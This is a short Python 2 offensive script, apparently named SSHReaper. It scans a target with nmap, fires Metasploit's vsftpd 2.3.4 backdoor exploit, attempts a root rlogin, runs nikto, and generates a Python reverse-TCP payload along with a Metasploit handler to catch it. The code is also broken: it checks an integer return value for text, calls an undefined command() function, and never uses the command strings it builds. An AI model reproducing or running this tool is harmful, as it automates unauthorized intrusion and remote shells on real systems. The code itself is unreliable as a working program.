import sys
import os
import subprocess
import time


# Nmap scan

nmapscan = raw_input("\033[1;31;40mWould you like to perform an nmap scan (1 for yes 2 for no): ")


os.system('cls' if os.name=='nt' else 'clear')

# Nmap vulnerability check

if int(nmapscan) == 1:
    subnet = raw_input("\033[1;31;40mEnter subnet/IP of target to scan: ")
    print("Launching nmap...")
    scan = os.system("nmap " + subnet)
    if "ftp" in scan:
        runvsftpd = input("We may have found a backdoor in the target's system, would you like to execute?: ")
        if "y" in runvsftpd:
            vsftpdtarget = input("Enter the IP of the vulnerable target: ")
            print("Interacting with backdoor...")
            time.sleep(2)
            file = open("metasploitscript.rc","w")
            file.write("use exploit/unix/ftp/vsftpd_234_backdoor\n")
            file.write("set RHOSTS " + vsftpdtarget + "\n")
            file.write("exploit\n")
            file.close()
            os.system("msfconsole -q -r metasploitscript.rc")
        else:
            print("Didn't find any interesting vulnerabilities, continuing...")
            time.sleep(2)



else:
    print("")


os.system('cls' if os.name=='nt' else 'clear')


# User raw_input

ip = raw_input("\033[1;31;40mEnter the IP of your target/website: ")


attack = raw_input("\033[1;31;40mAvailable exploits:\n\tRLOGIN EXPLOIT (1)\n\tFULL VULNERABILITY SCAN (Only if you entered website) (2)\n\tGENERATE PYTHON BACKDOOR (3)\nWhat exploit would you like to use?: ")

os.system('cls' if os.name=='nt' else 'clear')


if int(attack) == 1:

    # Connecting to server with exploitable service
    bashCommand = ("xterm -hold -e rlogin -l root " + ip)
    command()
    os.system('cls' if os.name=='nt' else 'clear')
    print("Hope hacking (legally of coruse :), if the exploit didn't succeed try another one.")
else:
    print("")

if int(attack) == 2:
    bashCommand = ("xterm -hold -e nikto -h " + ip)
    command()

if int(attack) == 3:
    print("Generating payload")
    bashCommand = "xterm -e msfpc stageless cmd py tcp"
    command()
    os.system('cls' if os.name=='nt' else 'clear')
    print("Payload has been generated in your SSHReaper directory.")
    time.sleep(4)
    os.system('cls' if os.name=='nt' else 'clear')
    runhandler = raw_input("Would you like to launch a handler? (1 for YES | 2 for NO): ")
    if int(runhandler) == 1:
        bashCommand = "xterm -hold -e msfconsole -q -r python-shell-stageless-reverse-tcp-443-py.rc"
        command()
    else:
        print("Happy hacking :)")
os.system("rm -rf metasploitscript.rc")